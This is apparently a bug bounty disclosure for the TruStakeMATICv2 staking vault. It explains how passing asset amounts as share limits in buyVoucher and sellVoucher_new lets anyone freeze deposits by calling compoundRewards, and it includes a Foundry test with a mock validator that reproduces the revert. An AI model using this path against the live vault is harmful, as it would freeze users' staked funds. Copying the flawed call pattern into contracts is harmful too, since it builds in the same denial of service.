# Title

Incorrect voucher parameter usage in TruStakeMATICv2 leads to temporary freezing of funds

# Target

https://github.com/TruFin-io/staking-contracts

# Impact(s)

Temporary freezing of funds

# PoC Link

https://gist.github.com/wylis-hodor/3b1b309c281e96c2b3b6b7041b7bfd7f

# Description

## Intro

The `TruStakeMATICv2` vault incorrectly passes asset amounts where share amounts are expected in its calls to the `ValidatorShare` contract. This mistake causes deposits to fail once rewards push the validator’s exchange rate above 1, and withdrawals to fail if the rate ever drops below 1 (slashing). Because the vault exposes a public `compoundRewards` function that accelerates this condition, an attacker can deliberately force deposits to revert. The result is a temporary freeze of user funds across the vault, disrupting normal staking operations.

## Vulnerability Details

The `TruStakeMATICv2` vault misuses the Polygon `ValidatorShare` API by passing asset amounts in both parameters of the voucher functions, instead of providing assets for the first parameter and shares for the second.

**Deposit Path**

In the vault’s private _stake helper:

```solidity
function _stake(uint256 _amount, address _validator) private {
    uint256 amountToDeposit = IValidatorShare(_validator).buyVoucher(_amount, _amount);
    validators[_validator].stakedAmount += amountToDeposit;
}
```

The call `buyVoucher(_amount, _amount)` is invalid because the second argument (`minSharesToMint`) expects **shares**, not assets.

The Polygon voucher math is:

* mintedShares = floor(assets * 1e18 / exchangeRate)

* Condition: `mintedShares >= minSharesToMint`

By passing `_amount` (assets) as minSharesToMint`, the inequality only holds if `exchangeRate <= 1e18`. Once rewards are restaked (exchangeRate > 1e18), deposits begin to **revert**.

**Withdraw Path**

Similarly, in `_unbond`:

```solidity
function _unbond(uint256 _amount, address _validator) private returns (uint256) {
    validators[_validator].stakedAmount -= _amount;
    IValidatorShare(_validator).sellVoucher_new(_amount, _amount);
    return IValidatorShare(_validator).unbondNonces(address(this));
}
```

Here `sellVoucher_new(claimAmount, maximumSharesToBurn)` is also misused: both parameters are set to the asset amount. The check inside the validator is:

* burnSharesNeeded = ceil(assets * 1e18 / exchangeRate)

* Condition: `burnSharesNeeded <= maximumSharesToBurn`

With `_amount` used for `maximumSharesToBurn`, the condition only holds if `exchangeRate >= 1e18`. In the event of slashing (exchangeRate < 1e18), withdrawals revert.

**Attacker Trigger (DoS Vector)**

The vault exposes a public `compoundRewards` function:

```solidity
function compoundRewards(address _validator) external nonReentrant whenNotPaused {
    (uint256 globalPriceNum, uint256 globalPriceDenom) = sharePrice();
    uint256 amountRestaked = _restake();
    ...
}
```

Any EOA can call this and trigger `_restake()`, which increases the validator’s exchange rate. As soon as p > 1e18, deposits revert due to the incorrect buyVoucher call. This creates an attacker-triggered denial-of-service, freezing deposits at will.

**Prior Audit Reference**

OpenZeppelin’s July 2023 audit of `TruStakeMATICv2` (finding **H-01: Incorrect Calculation of Total Amount Staked**) highlighted errors in how the vault integrated with `ValidatorShare`, and the team attempted a fix in a fork. However, while the `totalStaked` calculation was patched in that branch, the voucher parameter mismatch remains in the bug bounty repo, leaving the system exposed to deposit/withdraw freezes.

## Impact Details

The incorrect use of voucher parameters in `TruStakeMATICv2` directly exposes user deposits and withdrawals to denial-of-service conditions tied to the validator’s exchange rate.

* Deposits: Once any validator’s exchange rate rises above 1e18 (the normal case after rewards accrue), all further deposits revert. Anyone can accelerate this condition by calling the public `compoundRewards`, ensuring the rate is pushed upward and deposits are frozen.

* Withdrawals: If the exchange rate ever falls below 1e18 (e.g. due to a slashing), user withdrawals revert because the vault underestimates the shares required to burn.

**Primary Impact**

Temporary freezing of user funds: Users may be unable to deposit or withdraw at all, depending on the exchange rate conditions. This directly matches the High severity impact category in scope for the program.

**Secondary Impacts**

* User attrition and reputational risk: Because the freeze can be triggered by anyone (via compoundRewards), malicious actors can grief the system repeatedly.

* Slashing scenario amplification: If a validator slash lowers the exchange rate below 1, legitimate withdrawals will fail until a manual patch or upgrade is deployed.

**Scope of Affected Assets**

* All user MATIC staked through `TruStakeMATICv2`.

* Vault shares (TruMATIC) representing claims on those stakes.

**Magnitude of Loss**

While funds are not directly stolen, they are rendered inaccessible under normal operation until the contracts are upgraded. This freeze can affect the entire vault’s user base simultaneously.

## Proof of Concept

Step-by-step reproduction (what the foundry test demonstrates):

1. Alice deposits at price = 1

Start with validator exchange rate p = 1e18.

Alice mints/approves amt and calls `depositToSpecificValidator(amt, validator)`.

Deposit succeeds (shares minted = floor(amt * 1e18 / p) = amt).

2. Anyone bumps the price above 1

A public caller (could be bad actor) invokes `compoundRewards`, passing a reward (e.g., totalStake()/100 ≈ +1%).

This restakes rewards and increases the exchange rate so p > 1e18.

3. Bob’s deposit now reverts

Bob mints/approves the same amt and attempts `depositToSpecificValidator(amt, validator)`.

The vault calls `buyVoucher(amt, amt)` (mistakenly using assets for minSharesToMint).

Validator computes `sharesToMint = floor(amt * 1e18 / p) < amt`, so `sharesToMint >= minSharesToMint` fails and the call reverts with "INSUFFICIENT_SHARES".

**Result**: Once p > 1e18, new deposits are frozen. Because the price bump is publicly triggerable via `compoundRewards`, an attacker can force this condition at will.

## Proof of Code

1. Place code in `test/Foundry/Matic_SimpleDeposit.t.sol`

2. Run `forge test -vvvv`

3. You’ll see the test pass with the expected revert being caught (look for `INSUFFICIENT_SHARES` in the failure message captured by `vm.expectRevert`).

The code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {TruStakeMATICv2} from "../../contracts/main/TruStakeMATICv2.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/// ------------------------------------------------------------------------
/// Whitelist stub that approves everyone
/// ------------------------------------------------------------------------
contract WhitelistAlwaysTrue {
    function isUserWhitelisted(address) external pure returns (bool) {
        return true;
    }
}

/// @notice Faithful subset of Polygon PoS ValidatorShare logic (just what we need):
/// - ERC20-like "shares" (internal only)
/// - buyVoucher() mints shares based on current exchange rate and REVERTS if shares < minSharesToMint
/// - sellVoucher_new() burns shares for stake
/// - getTotalStake(user) = userShares * exchangeRate / RATE_PRECISION (like Polygon)
/// - compoundRewards() simulates validator rewards
contract ValidatorShareLite {
    // Change to 1e18 so rate/units align with vault expectations
    uint256 private constant RATE_PRECISION = 1e18;

    ERC20Mock public stakeToken;

    mapping(address => uint256) private _shares;
    uint256 private _totalShares;
    uint256 private _totalStake;

    constructor(address _stakeToken) {
        stakeToken = ERC20Mock(_stakeToken);
    }

    // --- Views ---
    function exchangeRate() public view returns (uint256) {
        if (_totalShares == 0) return RATE_PRECISION; // 1e18 at genesis
        // rate = totalStake / totalShares, scaled by 1e18
        return (_totalStake * RATE_PRECISION) / _totalShares;
    }

    function getExchangeRate() external view returns (uint256) {
        return exchangeRate(); // returns 1e18 at genesis
    }

    function balanceOf(address user) external view returns (uint256) {
        return _shares[user];
    }

    function totalShares() external view returns (uint256) {
        return _totalShares;
    }

    function totalStake() external view returns (uint256) {
        return _totalStake;
    }

    function getTotalStake(address user) external view returns (uint256) {
        return (_shares[user] * exchangeRate()) / RATE_PRECISION;
    }

    // --- Core ---
    function buyVoucher(uint256 amount, uint256 minSharesToMint) external payable returns (uint256) {
        uint256 rate = exchangeRate();
        uint256 sharesToMint = (amount * 1e18) / rate;
        // Fail fast on slippage BEFORE any token transfer, matching how many production routers/validators
        // do slippage checks prior to moving funds.
        require(sharesToMint >= minSharesToMint, "INSUFFICIENT_SHARES");
        if (amount > 0) {
            require(stakeToken.transferFrom(msg.sender, address(this), amount), "pull fail");
        }

        _totalStake += amount;
        _totalShares += sharesToMint;
        _shares[msg.sender] += sharesToMint;

        // return value the vault expects (Polygon returns amountToDeposit)
        return amount;
    }

    function sellVoucher_new(uint256 claimAmount, uint256 maxSharesToBurn) external {
        uint256 rate = exchangeRate();
        uint256 requiredShares = (claimAmount * RATE_PRECISION) / rate;

        require(requiredShares <= _shares[msg.sender], "INSUFFICIENT_BAL");
        require(requiredShares <= maxSharesToBurn, "SLIPPAGE");

        _shares[msg.sender] -= requiredShares;
        _totalShares -= requiredShares;
        require(_totalStake >= claimAmount, "STAKE_UNDERFLOW");
        _totalStake -= claimAmount;
    }

    // --- Rewards simulation ---
    function compoundRewards(uint256 rewardAmount) external payable {
        if (msg.value > 0) {
            require(rewardAmount == msg.value, "reward != msg.value");
        }
        _totalStake += rewardAmount; // shares unchanged → rate increases
    }

    // --- Shims ---
    function getLiquidRewards(address) external pure returns (uint256) {
        return 0;
    }

    function withdrawRewards() external pure returns (uint256) {
        return 0;
    }

    function restake() external {}
}

/// ------------------------------------------------------------------------
/// Foundry test
/// ------------------------------------------------------------------------
contract Matic_SimpleDepositTest is Test {
    TruStakeMATICv2 public vault; // proxy address cast to the logic type
    TruStakeMATICv2 public impl; // implementation (not used after deploy)
    ERC20Mock public tMATIC;
    ValidatorShareLite public validator;
    WhitelistAlwaysTrue public whitelist;

    address public VALIDATOR;
    address public TREASURY = address(0x7777);
    address public ALICE = address(0xA11CE);
    address public BOB = address(0xB0B);

    function setUp() public {
        // --- Deploy mocks ---
        tMATIC = new ERC20Mock();
        whitelist = new WhitelistAlwaysTrue();

        // Our faithful-lite Polygon validator
        validator = new ValidatorShareLite(address(tMATIC));
        VALIDATOR = address(validator);

        // --- Deploy vault implementation + initialize via proxy ---
        impl = new TruStakeMATICv2();

        bytes memory initCalldata = abi.encodeCall(
            TruStakeMATICv2.initialize,
            (
                address(tMATIC),
                address(this), // stakeManager, which we do not use
                VALIDATOR,
                address(whitelist),
                TREASURY,
                uint256(0), // phi
                uint256(0) // distPhi
            )
        );

        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), initCalldata);
        vault = TruStakeMATICv2(address(proxy));

        // --- Allow the validator to pull tMATIC from the vault ---
        // (On real Polygon the StakeManager is the spender; in our slim harness the validator pulls directly.)
        vm.prank(address(vault));
        tMATIC.approve(VALIDATOR, type(uint256).max);
    }

    function test_DepositReverts_AfterRateUp() public {
        uint256 amt = 100 ether;

        // FIRST deposit at rate == 1 → PASS
        tMATIC.mint(ALICE, amt);
        vm.startPrank(ALICE);
        tMATIC.approve(address(vault), amt);
        vault.depositToSpecificValidator(amt, address(validator));
        vm.stopPrank();

        // Push exchange rate above 1
        uint256 reward = validator.totalStake() / 100; // for ~1%
        validator.compoundRewards(reward);

        // SECOND deposit REVERTs in validator’s minShares check
        tMATIC.mint(BOB, amt);
        vm.startPrank(BOB);
        tMATIC.approve(address(vault), amt);
        vm.expectRevert(bytes("INSUFFICIENT_SHARES"));
        vault.depositToSpecificValidator(amt, address(validator));
        vm.stopPrank();
    }
}
```

The GIST contains an additional one-deposit test which shows all the correct balances.

